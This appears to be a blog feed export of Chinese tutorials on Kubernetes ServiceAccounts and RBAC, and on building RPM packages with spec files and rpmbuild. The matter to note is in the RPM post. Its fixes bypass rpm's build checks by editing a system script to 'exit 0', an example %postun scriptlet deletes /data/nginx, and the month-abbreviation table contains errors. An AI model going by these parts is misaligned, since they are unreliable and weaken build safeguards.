--dry-run\rserveraccount本身不具备权限，可以使用rbac对serviceaccount授予权限\n创建完之后会自动生成一个token信息，用于让sa连接至当前系统认证的信息。注：认证不代表权限，可以登录、认证到Kubernetes但是做不了其余事情。所有的的操作权限靠授权实现的。\n在创建Pod中使用自定义的sa\nspec:\rcontainers:\rserviceAccountName: admin\rVolumes:\rdefault-token-4pj85:\rType: Secret (a volume populated by a Secret)\rSecretName: default-token-4pj85\rOptional: false\rQoS Class: BestEffort\rNode-Selectors: \u0026lt;none\u0026gt;\r在定义好secret后，在定义Pod时，使用 imagePullSecrets 指明用哪个secret对象，secret对象中包含了认证私有regsi的账号和密码。\n在Pod当中也可以不使用imagePullSecrets来告诉Pod如何去下载镜像文件。而可以直接使用serviceAccountName。serviceAccountName相当于指定一个sa账号，而sa账号是可以附带认证到私有regsiry的secret信息的。Pod通过sa的Image pull secrets也能完成资源镜像下载时的认证。这样就不会在Pod资源清单中泄露出去secret使用的什么信息。\n使用kubectl describe sa admin\nPod获取私有镜像时的两种认证方式\n在Pod上直接使用imagePullSecrets字段指定认证使用的secret对象。 在Pod自定义serviceAccount，在serviceAccount附加此Pod获取镜像认证时使用的secret对象。 Reference controlling access\n","permalink":"https://www.oomkill.com/2018/09/kubernetes-serviceaccount/","summary":"","title":"kubernetes概念 - serviceaccount"},{"content":"RPM概述 RPM (Red Hat Package Manager)，几乎所有的 Linux 发行版本都使用这种形式的软件包管理安装、更新和卸载软件。对于最终用户来说，使用RPM所提供的功能来维护系统是比较容易和轻松的。安装、卸载和升级RPM软件包只需一条命令就可以搞定。RPM维护了一个所有已安装的软件包和文件的数据库，可以让用户进行查询和验证工作。在软件包升级过程中，RPM会对配置文件进行特别处理，绝对不会丢失以往的定制信息。对于程序员RPM可以让我们连同软件的源代码打包成源代码和二进制软件包供最终用户使用。\n一般而言制作一个RPM包包含以下几个步骤\n计划你想要建立什么 收集软件包 根据需要修补软件 计划升级旧有的包 创建可重现的软件构建 概述任何依赖关系 构建rpm 测试rpm（能否安装、升级） RPM capability 能力 运行或安装需要依赖于其他的RPM包本身或所提供的文件为基础的现象被称之为依赖关系。但在制作RPM包时，依赖关系有两类编译依赖与安装依赖。\n自身名字所包含的意义 它提供的文件也有可能被其他软件所依赖，文件本身也能识别成一种能力 编译依赖和安装依赖\n每一个RPM包都提供一种能够完成任务的功能，此种能力很可能被其他RPM所依赖，此能力大多数情况下和RPM名字是相同的。\n制作RPM包的纲要有如下四部\n设定RPM包制作的目录结构（制作车间） 将原材料（源码包、配置文件、补丁包）放置规划好的目录当中。 创建spec文件，指挥如何使用原材料将其制作成rpm包。 编译源代码生成rpm包 在一个特定的目录中提供如下5个子目录 redhat上默认在/usr/src/reahat BUILD 源代码解压以后放置的位置，仅需提供目录。 RPMS 放置制作完成后的RPM包 SOURCES 原材料放置目录（配置文件、源码包、补丁包） SPECS 放置spec文件（纲领性文件）的。 SRPMS SRC rpm包存放位置 RPM优缺点 优点：\n集中管理：RPM可以集中管理安装、升级和删除软件包，保证系统的干净和稳定。 精确控制：RPM提供详细的软件包信息，可以对软件包的安装路径、依赖关系、版本等进行精确控制，使得软件安装更加灵活便捷。 简单易用：RPM提供了一套完整的命令行工具和图形化管理工具，对于普通用户来说，使用起来非常方便。 更新机制：RPM可以根据用户需要进行更新，包括安全更新、功能更新和修复错误等，可以更好地保证系统安全与稳定性。 缺点：\n依赖管理：RPM虽然可以管理软件包的依赖关系，但其解决依赖的方式容易出现问题，可能会出现某些软件包的依赖关系无法解决的情况。 更新速度：由于需要对软件包进行依赖检查等操作，升级软件包可能需要较长时间，特别是当软件包依赖比较复杂时。 存在问题：有时候使用RPM安装的软件包出现问题，需要手动卸载并重新安装，这会导致一些无法预测的麻烦。 兼容性：RPM采用了特定的软件包管理标准，要求安装的软件包必须符合这些标准。因此，RPM可能不太适用于其他Linux系统或自定义的软件包格式。 SPEC文件 制作RPM软件包的关键在于编写SPEC软件包描述文件。要想制作一个rpm软件包就必须写一个软件包描述文件（SPEC）。这个文件中包含了软件包的诸多信息，如软件包的名字、版本、类别、说明摘要、创建时要执行什么指令、安装时要执行什么操作、以及软件包所要包含的文件列表等等。\nSPEC文件通常包括以下几个部分：\n头文件：包括软件包的名称、版本、发布号、授权等信息。\n%description：包括软件包的描述、依赖关系、构建环境等信息。\n%prep：指定源代码的来源和如何解压缩及准备源代码。\n%build：指定如何编译源代码。\n%install：指定如何安装编译好的软件包。\n%check：指定测试源代码的特定部分，通常是用来运行单元测试。\n%clean：指定清除构建过程中产生的临时文件和目录的方法。\n%files：指定哪些文件应该包括在最终的RPM文件中。\n%changelog：记录软件包的变更历史。\nSPEC文件中常用的宏变量 宏变量 说明 %{name} 软件包的名称，如 myapp。 %{version} 软件包的版本号，如 1.0.0。 %{release} 软件包的发布号，如 1。 %{buildroot} RPM 构建过程中的临时根目录目，模拟真实的rootfs。 %{_bindir} 系统安装二进制程序的目录，通常是 /usr/bin。 %{_docdir} man dbus 查看帮助的文档的目录，通常是 /usr/share/doc %{_datadir} 系统安装数据文件的目录，通常是 /usr/share。 %{_includedir} 系统安装头文件的目录，通常是 /usr/include。 %{_libdir} 系统安装库文件的目录，通常是 /usr/lib，64位为 /usr/lib64 %{_datarootdir} 系统安装数据的根目录，通常是 /usr/share。 %{_prefix} 软件的安装路径前缀，通常是 /usr。 %{_sysconfdir} 系统配置文件的目录，通常是 /etc。 %{_var} 系统的/var目录路径 通常情况下在封装包时使用这些宏变量，封装对应目录下的内容而不用考虑每种 Linux 系统的路径差异。例如，我们可以使用 %{_bindir} 来指定安装软件的二进制程序所在目录，而不需要考虑不同系统中二进制程序目录的具体路径，这样可以确保软件在不同系统中能够正确安装和运行。\nSPEC参数解释 文件头部分 参数 详解 Name 软件的名称，构成RPM文件的文件名构成之一 Version 软件的版本号，构成RPM文件的文件名构成之一 Release 该版本打包的次数说明，构成RPM文件的文件名构成之一 Group 软件开发团体名称 Source 软件的来源，可以是URl或者文件。可以有多个，如：\nSource: php-5.3.29.tar.gz\nSource1:php.ini\nSource2:php-fpm Patch 作为软件的补丁。 BuildRoot 设置编译时，临时存放中间文件的路径。 License 软件授权模式。一般使用GPL。 Requires 这个软件的依赖程序。 description 软件的尖端说明。这个是必须的。rpm -qi software name显示的基础说明。\nprep prepare的简写，此段的意思为，尚未进行设置或安装之前，你要编译完成的PRM帮你事先做的事情。一般情况有如下事项：\n进行软件的补丁相关工作。 寻找软件需要的目录是否存在。 事先创建软件所需要的目录，或事先进行的任务。 备份可能会替换的文件。 id nginx || useradd nginx -s /sbin/nologin -M\r%setup -q\rsetup 此选项类似于解压之类的工作，常用选项如下表所示：\n参数 说明 %setup 不加任何选项，仅将软件包打开。 %setup -n newdir 将软件包解压在newdir目录。 %setup -c 解压缩之前先产生目录。 %setup -b num 将第num个source文件解压缩。 %setup -T 不使用default的解压缩操作。 %setup -T -b 0 将第0个源代码文件解压缩。 %setup -c -n newdir 指定目录名称newdir，并在此目录产生rpm套件。 %setup -q 提取源码到 BUILD 目录; -q 指不显示输出（quietly） build 构建区域 所要执行的命令为生成软件包服务，如configure、make等操作。\n./configure\rmake -j 4\rinstall 安装区域 其中的命令在安装软件包时将执行，如make install命令。在spec文件中的make install后面加上DESTDIR=%{buildroot} DESTDIR是Makefile文件中定义的一个安装路径的变量，根据实际情况修改， 例如mysql和nginx的是DESTDIR，而php的是INSTALL_ROOT。\n%install\rmake INSTALL_ROOT=%{buildroot} install #\u0026lt;==php\rmake install DESTDIR=%{buildroot} #\u0026lt;==nginx\rfiles 打包文件区域 定义哪些文件将被打包入RPM中，分为三类\u0026ndash;说明文档（doc），配置文件（config）及执行程序，还可定义文件存取权限，拥有者及组别。\n%defattr (-,root,root) 指定包装文件的属性，分别是(mode,owner,group)，- 表示默认值，对文本文件是0644，可执行文件是0755 %exclude 列出不想打包到rpm中的文件。 %dir 来指定空目录 %config 配置文件 %doc 文档 %files\r%defattr(-,root,root,-)\r/usr/share/php-5.3.29/*\r注：这里是在虚拟根目录下进行，千万不要写绝对路径，而应用宏或变量表示相对路径。\nchangelog 修改日志区域 语法：第一行是：* 星期 月 日 年 修改人 电子信箱；其中：星期、月份均用英文形式的前3个字母，用中文会报错。 接下来的行写的是修改了什么地方，一般以\u0026quot; - \u0026ldquo;号开始，可写多行。\n* Tue Dec 29 1998 lc \u0026lt;lc.com@gmail.com\u0026gt;\r- minimum spec and patches changes for openssl\r- modified for openssl sources\r附录：\n12个月简写 全称 简写 January Jan February Feb March Ma April Apr May - June - July - August Aug September Sept October Oct November Nov December Dec 一星期7日简写 全称 简写 Monday Mon Tuesday Tues Wednesday Wed Thurday Thur Friday Fri Saturday Sat Sunday Sun clean 清理区域 用来清理 build 后的临时文件,主要是怕这些旧的文件影响以后编译。主要是要删除 $RPM_BUILD_ROOT 和运行 make clean 。\nD-Bus0 Scriptlets 这些选项可以让你动态的使用 shell 脚本来控制安装和删除，\n%pre rpm安装前执行的脚本 %post rpm安装后执行的脚本 %preun rpm卸载前执行的脚本 %postun rpm卸载后执行的脚本 %preun 在升级的时候会执行， %postun在升级rpm包的时候不会执行\nrpm -q --scripts packagename # 查看脚本的信息 SERVER_BIN_DIR\tCLIENT_BIN_DIR\r示例nginx.spec Name: nginx\rVersion: 1.13.9\rRelease: 1%{?dist}\rSummary: nginx\rGroup: nginx\rLicense: GPL\rURL: http://dangjian.chinamoblie.com\rPackager: nginx\rVendor: nginx\rSource0: nginx-1.13.9.tar.gz\rSource1: nginx.service\rRequires: openssl-devel,pcre-devel\rBuildRoot: %{_tmppath}/%{name}-%{version}-buildroot\r%description nginx\r%prep\rid nginx || useradd nginx -s /sbin/nologin -M\r%setup -q\rchmod +x ./configure\r%build\r./configure --prefix=/usr/share/nginx \\\r--sbin-path=/usr/sbin/nginx \\\r--with-stream \\\r--conf-path=/etc/nginx/nginx.conf \\\r--error-log-path=/data/nginx/log/error.log \\\r--pid-path=/data/nginx/run/nginx.pid \\\r--lock-path=/data/nginx/lock/nginx.lock \\\r--user=nginx --group=nginx \\\r--with-http_ssl_module \\\r--with-http_stub_status_module \\\r--with-http_flv_module \\\r--with-http_gzip_static_module \\\r--http-log-path=/data/nginx/log/access.log --http-client-body-temp-path=/data/nginx/tmp/client/ \\\r--http-proxy-temp-path=/data/nginx/tmp/proxy/ \\\r--http-fastcgi-temp-path=/data/nginx/tmp/fcgi/ \\\r--http-scgi-temp-path=/data/nginx/tmp/scgi \\\r--http-uwsgi-temp-path=/data/nginx/tmp/uwsgi\rmake\r%install\rmake install DESTDIR=$RPM_BUILD_ROOT\r%{__install} -p -D %{SOURCE1} %{buildroot}/usr/lib/systemd/system/nginx.service\r%{__mkdir_p} /data/nginx/tmp/{client,uwsgi,scgi,fcgi,proxy}\r%files\r%defattr(-,root,root,-)\r%attr(0644,root,root) /usr/share/nginx/*\r%attr(0755,root,root) /usr/sbin/nginx\r%attr(0644,root,root) /etc/nginx/*\r%attr(0744,nginx,nginx) /data/nginx/*\r%attr(0744,root,root) /usr/lib/systemd/system/nginx.service\r%clean\rrm -rf $RPM_BUILD_DIR/%{name}-%{version}\r%pre\rid nginx || useradd nginx -s /sbin/nologin -M\r%preun\rsystemctl stop nginx\r%postun\rrm -fr /data/nginx/\ruserdel nginx\r%changelog\r* Sun Aug 24 2015 LC 1.15-1\r- package libiconv-1.15\rrpmbuild rpmbuild 是用于构建 RPM 包的工具。RPM 是一种软件包管理格式，它可以简化软件的分发，使其在不同的 Linux 系统上易于安装和使用。rpmbuild 工具可以帮助我们构建这样的 RPM 包。\n参数 说明 -ba 既生成src.rpm又生成二进制rpm -bs 只生成src的rpm -bb 只生二进制的rpm -bp 执行到pre -bc 执行到 build段 -bi 执行install段 -bl 检测有文件没包含 rpmbuild 安装 rpm包并不仅仅限制于 Fedora/Redhat ，也可以使用在其他的发行版中\n对于 CentOS：\nsudo yum install -y rpm-build redhat-rpm-config rpmdevtools\r对于 Fedora：\nsudo dnf install -y rpm-build redhat-rpm-config rpmdevtools\r对于 Ubuntu：\nsudo apt install -y rpm\r查看默认宏\nrpmbuild --showrc\r创建 RPM 构建目录 要开始构建 RPM 包，您需要先创建 RPM 构建目录和相关文件。使用以下命令创建 RPM 构建目录和必要的子目录：\ncd ~\rmkdir -p rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}\r上述命令创建了 5 个子目录：\nBUILD: 构建 RPM 包所需的源码和二进制文件存放的目录。 RPMS: 二进制 RPM 包保存的目录。 SOURCES: 存储软件包的源代码，rpmbuild 根据该代码创建 RPM 包。 SPECS: INCLUDE metadata and build instructions files for creating RPM files SRPMS: 用于存储源 RPM 包的目录。 rpmbuild示例：如何使用rpmbuild制作php rpm包 mkdir -pv ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}\rphp有一个依赖库，在yum源于epel源中都没有需要自己打包libiconv\n编写 libiconv 的spec文件\n%define __os_install_post %{nil}\r%define debug_package %{nil}\rName: libiconv\rVersion: 1.15\rRelease: 1%{?dist}\rSummary: liconv\rGroup: liconv\rLicense: GPL\rURL: http://www.test.net\rPackager: test\rVendor: test\rSource0: libiconv-1.15.tar.gz\rBuildRoot: %{_tmppath}/%{name}-%{version}-buildroot\r%description iconv\r%prep\r%setup -q\r%build\r./configure --prefix=/usr/share/libiconv-1.15 \\\rmake\r%install\rmake install DESTDIR=%{buildroot}\r%files\r%defattr(-,root,root,-)\r%attr(0655,root,root) /usr/share/libiconv-1.15/*\r%attr(0755,root,root) /usr/share/libiconv-1.15/bin/*\r%clean\rrm -rf $RPM_BUILD_DIR/%{name}-%{version}\r%post\rln -sv /usr/share/libiconv-1.15/ /usr/share/libiconv\r%changelog\r* Sun Aug 24 2015 LC 1.15-1\r- package libiconv-1.15\r打包libiconv遇到的错误 Binary file /root/rpmbuild/BUILDROOT/libiconv-1.15.el7.centos.x86_64/usr/share/libiconv-1.15/bin/iconv matches\rFound '/root/rpmbuild/BUILDROOT/libiconv-1.15-1.el7.centos.x86_64' in installed files; aborting\rerror: Bad exit status from /var/tmp/rpm-tmp.6AgqPk (%install)\rRPM build errors:\rBad exit status from /var/tmp/rpm-tmp.6AgqPk (%install)\r问题原因：\n在rpm构建过程中，在％install阶段结束时，运行 /usr/lib/rpm/check-buildroot脚本以检查构建根目录中的文件。此脚本扫描构建根目录中的所有文件，以获取${RPM_BUILD_ROOT}路径的任何引用。\n也就是说libiconv已经编译完成。一般情况下，是可以正常使用的。所以不需要他检查构建根目录。\n解决方法：通过报错信息可以得到如下提示\nRPM build errors:\rBad exit status from /var/tmp/rpm-tmp.6AgqPk (%install)\r根据保存信息查看文件的执行过程。/var/tmp/rpm-tmp.6AgqPk，并发现脚本在执行到/usr/lib/rpm/check-buildroot时停止了。也就是说，执行这个脚本检查构建根目录时$?不为0\ncd 'libiconv-1.15'\rmake install DESTDIR=/root/rpmbuild/BUILDROOT/libiconv-1.15-1.el7.centos.x86_64\r/usr/lib/rpm/check-buildroot\r查看/usr/lib/rpm/check-buildroot脚本，发现只有此段检查才$?返回的是1。\ntest -s \u0026quot;$tmp\u0026quot; \u0026amp;\u0026amp; {\rcat \u0026quot;$tmp\u0026quot;\recho \u0026quot;Found '$RPM_BUILD_ROOT' in installed files; aborting\u0026quot;\rexit 1\r} || : 由于压根不知道 $tmp 在哪里传入的。又压根可以不检查构建根目录的。直接在 /usr/lib/rpm/check-buildroot 脚本最前面加上 exit 0 让构建RPM包时跳过此步骤。之后成功完成rpm构建。\n参考文档： pk\u0026rsquo;s Tech Page: Found \u0026lsquo;${RPM_BUILD_ROOT}\u0026rsquo; in installed files; aborting\nc++ - What does /usr/lib/rpm/check-buildroot do? - Stack Overflow\n编写spec文件 Name: php\rVersion: 7.1.17\rRelease: 1%{?dist}\rSummary: php\rGroup: php\rLicense: GPL\rURL: http://php.org\rPackager: php\rVendor: php\rSource0: php-7.1.17.tar.bz2\rSource1: php.ini\rBuildRoot: %{_tmppath}/%{name}-%{version}-buildroot\rRequires: libiconv,zlib-devel,libxml2-devel,libjpeg-devel,libjpeg-turbo-devel,freetype-devel,libpng-devel,gd-devel,curl-devel,libxslt-devel,bzip2-devel,gmp-devel,readline-devel,mcrypt,mhash,libmcrypt-devel\r%description php\r%prep\rid nginx || useradd nginx -s /sbin/nologin -M\r%setup -q\r%build\r./configure \\\r--prefix=/usr/share/php-7.1.17 \\\r--with-config-file-path=/etc/php/ \\\r--exec-prefix=/usr \\\r--bindir=/usr/bin \\\r--sbindir=/usr/sbin \\\r--mandir=/usr/share/man \\\r--sysconfdir=/etc/php/ \\\r--with-mysqli=mysqlnd \\\r--with-iconv-dir=/usr/share/libiconv \\\r--with-jpeg-dir \\\r--with-png-dir \\\r--with-zlib-dir \\\r--with-libxml-dir \\\r--enable-xml \\\r--disable-rpath \\\r--enable-safe-mode \\\r--enable-bcmath \\\r--enable-shmop \\\r--enable-sysvsem \\\r--enable-inline-optimization \\\r--with-curl \\\r--enable-mbregex \\\r--enable-fpm \\\r--enable-mbstring \\\r--with-mcrypt \\\r--with-gd \\\r--enable-gd-native-ttf \\\r--with-openssl \\\r--with-mhash \\\r--enable-pcntl \\\r--enable-sockets \\\r--with-xmlrpc \\\r--enable-zip \\\r--enable-soap \\\r--enable-short-tags \\\r--enable-zend-multibyte \\\r--enable-static \\\r--with-xsl \\\r--with-fpm-user=nginx \\\r--with-fpm-group=nginx make -j 4\r%install\rrm -rf %{buildroot}\rmake INSTALL_ROOT=%{buildroot} install\r%{__install} -p -D %{SOURCE1} %{buildroot}/etc/php/php.ini\r%files\r%defattr(-,root,root,-)\r/usr/share/php-7.1.17/*\r%attr(0744,root,root) /usr/bin/*\r%attr(0744,root,root) /usr/sbin/*\r/usr/share/man/*\r/etc/php/*\r%pre\rid nginx || useradd nginx -s /sbin/nologin -M\r%post\rcp /etc/php/php-fpm.conf.default /etc/php/php-fpm.conf\rcp /etc/php/php-fpm.d/www.conf.default /etc/php/php-fpm.d/www.conf\r%postun\ruserdel nginx\r%changelog\r* Sun Aug 10 2018 lc zhoushilong\r- package php-7.1.71\r构建PHP RPM包遇到的问题 RPM build errors:\rbogus date in %changelog: Sun Aug 10 2018 lc zhoushilong\rExplicit %attr() mode not applicaple to symlink: /root/rpmbuild/BUILDROOT/php-7.1.17-1.el7.centos.x86_64/usr/bin/phar\rInstalled (but unpackaged) file(s) found:\r/.channels/.alias/pear.txt\r/.channels/.alias/pecl.txt\r/.channels/.alias/phpdocs.txt\r/.channels/__uri.reg\r/.channels/doc.php.net.reg\r/.channels/pear.php.net.reg\r/.channels/pecl.php.net.reg\r/.depdb\r/.depdblock\r/.filemap\r/.lock\r解决方法如下：\n方法1：生成的rpm包里有前面在%files里添加的这个文件，如下：\n/usr/local/php/.channels\r方法2：下面是直接删除的解决办法，实践OK（视具体情况是删除还是添加选一个即可）\nrm -rf %{buildroot}/{.channels,.depdb,.depdblock,.filemap,.lock} 方法三： /usr/lib/rpm/macros 修改宏\n# 构建根目录中的未打包文件是否应终止构建？\r%_unpackaged_files_terminate_build 1 # 把1改为0只警告\r%__check_files %{_rpmconfigdir}/check-files %{buildroot} # 这一行，把这一行注释掉，然后重新编译\r%__check_files说明：\nBuild configuration macros. Script gets packaged file list on input and buildroot as first parameter. Returns list of unpackaged files, i.e. files in $RPM_BUILD_ROOT not packaged. Note: Disable (by commenting out) for legacy compatibility.\n构建配置宏。 脚本在输入和buildroot上获取打包文件列表作为第一个参数。 返回未打包文件的列表，即 $ RPM_BUILD_ROOT 中未打包的文件。 注意：禁用（通过注释掉）旧版兼容性。\n打包报错 + '%{__debug_install_post}'\r/var/tmp/rpm-tmp.o0N7t4: line 45: fg: no job control\rerror: Bad exit status from /var/tmp/rpm-tmp.o0N7t4 (%install)\rRPM build errors:\rbogus date in %changelog: Sun Aug 24 2018 YB 1.14.2\rBad exit status from /var/tmp/rpm-tmp.o0N7t4 (%install)\r解决：使用以下命令禁用check-buildroot\n%define __arch_install_post %{nil}\r%define __os_install_post %{nil}\r关闭调试信息：\n%global debug_package %{nil}\r参考网址 rpmbuild 之 /usr/lib/rpm/check-buildroot\nrpmbuild - how to disable check-buildroot?\n[实践OK]rpmbuild报error: Installed (but unpackaged) file(s) found的解决办法\nrpmbuild 打包rpm实战\nrpmbuild 中文手册\nCreating RPM packages :: Fedora Docs Site\nHow to create an RPM package/zh-cn - Fedora Project Wiki\nFedora Packaging Guidelines - Fedora Project Wiki\n","permalink":"https://www.oomkill.com/2018/09/rpm-package/","summary":"","title":"Unix归档模式 cpio - 深入剖析与构建rpm包"},{"content":"Kubernetes API Object 在Kubernetes线群中，Kubernetes对象是持久化的实体（最终存入etcd 中的数据），集群中通过这些实体来表示整个集群的状态。前面通过kubectl来提交的资源清单文件，将我们的YAML文件转换成集群中的一个API对象的，然后创建的对应的资源对象。\nKubernetes API是一个以JSON为主要序列化方式的HTTP服务，除此之外支持Protocol Buffers序列化方式（主要用干集群内年件间的通信）。为了api的可扩展性，Kubemetes在不同的API路径（/api/v1或/apis/batch）下面支持了多个API版本，不同的API版本就味不同级别稳定性和支持。\nAlpha ：例如v1Alpha：默认情况下是禁用的，可以随时删除对功能的支持。 Beta：例如 v2beta1 默认是启用的，表示代码已经经过了很好的测试，但是对象的语义可能会在施后的版本中以不兼咨的方式更改 Stable：例如：v1 表示已经是稳定版本，也会出现在后续的很多版本中。 在Kubernetes集群中，一个API对象在Etcd 里的完整资源路径，是由：group （API组）、 version （API版本） 和 Resource API资源类型）三个部分组成。通过这种的结构，整个Kubernetes 中所有API对象，就可以用如下的树形结构表示出来：\nKubernetes API Object的使用 API对象组成查看：kubectl get --raw /\n通常，KubernetesAPI支持通过标准HTTP P0ST、PUT、DELETE 和 GET 在指定PATH路径上创建、更新、删除和检索操作，并使用JSON作为默认的数据交互格式。\n如要创建一个Deployment对象，那YAML文件的声明就需：\napiVersion: apps/v1 # kind: Deployment\rDeployment就是这个API对象的资源类型（Resource），apps就是它的组（Group），v1就是它的版本（Version）。API Group、Version 和资源满唯一定义了一个HTTP路径，然后在kube-apiserver 对这个url进行了监听，然后把对应的请求传递给了对应的控制器进行处理。\nAPI对象参考文档\n授权插件分类 Node 由节点来认证。\nABAC 基于属性的访问控制，RBAC之前的授权控制的插件算法\nRBAC Role-based Access Control。\nWebhook 基于http的回调机制来实现访问控制。\nRBAC 基于角色的访问控制可以理解为，角色（role）反而是授权的机制，完成了权限的授予、分配等。角色是指一个组织或者任务工作中的位置，通常代表一种权利、资格、责任等。在基于角色的访问控制中还有一种术语叫做 ==许可==（permission）。\n简单来讲就如同上图描述，使用户去扮演这个角色，而角色拥有这个权限，所以用户拥有这个角色的权限。所以授权不授予用户而授予角色。\nRBAC 使用 rbac.authorization.k8s.ioAPI组来驱动鉴权操作，允许管理员通过 Kubernetes API 动态配置策略。\n在 1.8 版本中，RBAC 模式是稳定的并通过 rbac.authorization.k8s.io/v1 API 提供支持。\n启用RBAC 要使用用RBAC，需要在启动kube-apiserver时添加--authorization-mode=RBAC 参数。\nAPI概述 ==/apis/[group]/[version]/namespaces/[namespaces_name]/[kind][/object_id]== 在Kubernetes当中的RBAC在实现授权时，无非就是定义标准的角色，在角色上绑定权限。使用户扮演角色。将这些概念体现为：\nrole 标准的Kubernetes资源\noperations 允许那些对象.. objects 执行那些操作.. rolebinding 角色绑定\nuser 将那个用户(user account OR service account)\u0026hellip;\nrole 绑定在那个角色上\u0026hellip;\nRule：规则是一组属于不同API Group资源上的一组操作的集合\nGroup：用来关联多个账户，集群中有一些默认建的组，比如cluster-admin\nSubject：主题，对应集群中尝试操作的对象，集群中定义了3种类型的主题资源：\nuser account：用户，Kubernetes真正意义上User，而是使用证书的CN与O，加上kubeconfig上下文实现用户与组，这个用户是由外部独立服务进行管理的，对于用户的管理集群内部没有一个关联的资源对象，所以用户不能通过集群内部的API来进行管理。 service account：通过KubernetesAPI来管理的一些用户帐号，和namespace进行关联的，适用于集群内部运行的应用程序，需要通过API来完成权限认证，所以在集群内部进行权限操作。 在Kubern1etes之上资源分属于两种级别\ncluster\nnamespaces\n所以role和rolebinding是在名称空间级别，授予此名称空间范围内的许可权限的。除了role和rolebinding之外，集群还有另外两个组件：\ncluster role 集群角色。\ncluster rolebinding 集群角色绑定。\ncluster role当中定义的权限是相对于多个名称空间共有，如果使用rolebinding绑定，这个权限被限制为 用户仅能获取rolebinding所属名称空间上的所有权限。\n使用 kubeconfig 文件组织集群访问 ​\t在使用kubectl命令时是有使用配置文件的，配置文件是kubectl连接服务器认证文件。kubectl config 是专门用来管理kubectl的配置文件的。所有连接apiserver的客户端在认证时，如果基于配置文件来保存客户端的认证信息就应该将其配置配置为配置文件。\n​\tkubernetes组件除了apiserver都可以被称之问apiserver客户端。每个组件为了能够连接正确的集群。apiserver需提供正确的私钥、证书等认证时使用的信息需要将这些信息保存为一个配置文件，此配置文件被叫做kubeconfig。\n​\tkubeconfig 文件可以用来组织有关集群、用户、命名空间和身份认证机制的信息。kubectl 命令行工具使用 kubeconfig 文件来与集群的 API 服务器进行通信。\n​\t默认情况下 kubeconfig 在 $HOME/.kube 目录下查找名为 config 的文件。可以设置 环境变量KUBECONFIG 或者设置 kubectl --kubeconfig 来选择指定的kubeconfig\ncontext ​\tkubeconfig 的 context ，定义对访问参数进行分组。每个context都有三个参数：cluster、namespace 和 user。默认情况下，kubectl 命令行工具使用 namespace 参数设置的值与集群进行通信。默认为defaul。\nkubectl config get-contexts 查看拥有上下文 kubectl config use-context 选择上下文 kubectl config set-credentials 设置一个用户项 reference\nset-credentials\nkubeconfig\n角色的创建与管理 ​\tKubernetes的访问权限主要可以梳理为几个步骤\n创建用户：使用CA签发用户认证证书作为用户名称。\n创建权限组：创建role或clusterrole确定操作权限。\n绑定用户和权限组：创建rolebinding或clusterrolebinding将权限绑定在用户上。\n使用用户访问验证：切换kubeconfig。\nrole cluster role rolebinding cluster rolebinding都是标准的Kubernetes资源，可以通过kubectl explain查看，或kubectl create role 创建\nrole在限制资源范围时有三种方式：\nresources 资源类别，允许对这些类所有资源支持授权 操作。 resource Names 资源名称，表示对此类别当中，某个或某些特定资源执行操作。 Non-Resource URLs 非资源url，是一些不能定义为对象的资源，在Kubernetes中通常表示对某些资源所执行的一种操作，或某种特殊操作。 ROLENAME=default-admin\rNS=default\rkubectl create clusterrole ${ROLENAME} \\\r--verb=get,list \\\r--resource=pods,deployments \\\r-o yaml \\\r-n default \\\r--dry-run=client apiVersion: rbac.authorization.k8s.io/v1\rkind: Role\rmetadata:\rname: pod-list\rnamespace: kube-system\rrules:\r- apiGroups:\r- \u0026quot;\u0026quot;\rresources:\r- pods\r- deployments\rverbs:\r- get\r- list\r- apiGroups: # 表示对哪些api群组内的资源做操作。\r- apps\r将权限与角色绑定\nUSERNAME=scott\rROLENAME=default-admin\rNS=default\rkubectl create clusterrolebinding ${ROLENAME} \\\r--clusterrole=${ROLENAME} \\\r--group=${ROLENAME} \\\r-n ${NS} \\\r-o yaml \\\r--dry-run=client\rapiVersion: rbac.authorization.k8s.io/v1\rkind: RoleBinding\rmetadata:\rname: podlist:testrbac\rnamespace: kube-system\rroleRef: # 引用那个role\rapiGroup: rbac.authorization.k8s.io # 那个api之内的\rkind: Role # 哪一类\rname: pod-list # role名称，为了避免引用的是cluster role必须使用 此方式来定义\rsubjects: # 动作的执行主题\r# 对于user group是 rbac.auth... 对于serviceaccount是\u0026quot;\u0026quot;\r- apiGroup: rbac.authorization.k8s.io\rkind: User\rname: testrbac # user并不是单独存在的用户资源\r创建用户\nUSERNAME=cylon\ropenssl genrsa -out ${USERNAME}.key 2048\ro=default-admin\ropenssl req -new \\\r-key ${USERNAME}.key \\\r-out ${USERNAME}.csr \\\r-subj \u0026quot;/CN=${USERNAME}/O=${o}\u0026quot; \\\r-days 3650\ropenssl x509 -req \\\r-in ${USERNAME}.csr \\\r-CA ca.crt \\\r-CAkey ca.key \\\r-out ${USERNAME}.crt \\\r-days 360\r配置kubeconfig\nUSERNAME=cylon\rkubectl config set-credentials ${USERNAME} \\\r--client-certificate=/etc/kubernetes/pki/${USERNAME}.crt \\\r--client-key=/etc/kubernetes/pki/${USERNAME}.key \\\r--embed-certs=true \\\r--kubeconfig=${USERNAME} # 输出到指定的配置文件，若不指定写入KUBECONFIG环境变量指定的路径\r设置上下文\nUSERNAME=cylon\rkubectl config set-context ${USERNAME}@kubernetes \\\r--cluster=kubernetes \\\r--user=${USERNAME}\r--kubeconfig=${USERNAME}\r设置集群\nkubectl config set-cluster k8s \\\r--certificate-authority=/etc/kubernetes/pki/ca.crt \\\r--embed-certs=true \\\r--server=https://127.0.0.1:6443 \\\r--kubeconfig=${USERNAME}\r在RBAC上进行授权时，允许我们存在3类组件 useraccount group serviceaccount\nuser 授权绑定时，cluster rolebinding 或 rolebinding 都可以绑定在user上，也可以绑定在group上，还可以绑定在service account上。 绑定在用户上，表示只授权一个用户扮演相关角色。\n绑定在在一个组上表示授权组内所有用户都在一个角色。所以想一次授权多个用户在一个名称空间中拥有一个权限可以定义为组。授权时做组授权。\n如果任何一个Pod在启动时以serviceaccount name作为使用的serviceAccount，Pod中的应用程序就拥有了它所授予的权限。\n创建Pod时可以给Pod指明一个属性。serviceAccount\n","permalink":"https://www.oomkill.com/2018/08/kubernetes-rbac/","summary":"","title":"kubernetes概念 - RBAC"},{"content":"近期因centos 6.x 默认openssh扫描存在大量漏洞，基于安全考虑，需要将openssh_5.3p1升级为最新版，网上查了很多教程，发现openssh存在大量依赖，不解决依赖问题很难保证其他服务政策。而openssl又被大量程序依赖。实在是头疼。最后发现一个不破坏各种依赖又可以完美升级的方案\n注：curl wget yum等依赖openssl 